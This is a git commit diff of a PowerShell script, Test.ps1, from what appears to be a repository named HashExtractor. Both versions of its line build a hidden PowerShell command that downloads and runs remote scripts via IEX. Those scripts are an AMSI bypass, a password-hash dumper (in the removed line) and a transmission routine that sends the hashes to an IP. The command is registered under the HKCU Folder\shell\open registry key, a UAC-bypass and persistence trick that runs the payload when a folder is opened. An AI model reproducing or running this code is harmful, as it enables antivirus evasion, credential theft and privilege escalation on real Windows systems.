f23401e08fe01742ecd5435be3cc59cc01bb016d
mo-tec <moritzpfefferkorn@hotmail.com>
2020-10-12 20:53:06 +0200

    Update Test.ps1

--- Test.ps1
+++ Test.ps1
@@ -1,4 +1,4 @@
-$program = "powershell -windowstyle hidden $a=((wget 'https://raw.githubusercontent.com/mo-tec/HashExtractor/master/AMSI-Bypass.ps1').Content);IEX $a;$b=((wget 'https://raw.githubusercontent.com/mo-tec/HashExtractor/master/Get-PassHashes.ps1').Content);$c=((wget 'https://raw.githubusercontent.com/mo-tec/HashExtractor/master/Invoke-Transmission.ps1').Content);IEX $b;IEX $c;Get-PassHashes | Out-String | Invoke-Transmission -ip localhost"
+$program = "powershell -windowstyle hidden $a=((wget 'https://raw.githubusercontent.com/mo-tec/HashExtractor/master/AMSI-Bypass.ps1').Content);IEX $a;$b=((wget 'https://raw.githubusercontent.com/mo-tec/HashExtractor/master/Invoke-Transmission.ps1').Content);IEX $b;"# | Out-String | Invoke-Transmission -ip localhost
 #$program = "powershell"
 New-Item "HKCU:\Software\Classes\Folder\shell\open\command" -Force -Value $program
 New-ItemProperty -Path "HKCU:\Software\Classes\Folder\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
